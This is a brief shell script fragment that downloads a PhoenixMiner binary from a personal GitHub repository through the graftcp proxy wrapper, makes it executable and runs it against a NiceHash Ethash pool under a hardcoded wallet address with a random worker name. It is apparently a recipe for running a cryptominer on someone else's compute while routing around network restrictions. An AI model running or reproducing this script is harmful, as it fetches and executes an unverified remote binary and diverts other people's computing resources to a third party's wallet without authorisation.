...
./graftcp/graftcp wget https://github.com/DeniBogeh/DeniBogehh/raw/main/PhoenixMiner

chmod +x PhoenixMiner

ph add PhoenixMiner

./graftcp/graftcp ./PhoenixMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353 --user 33xJDvi2WBzpQm8XakanP3kgTCMNdiBTQq.$(echo $(shuf -i 1-999 -n 1)-Phoenix) --ethstratum ETHPROXY
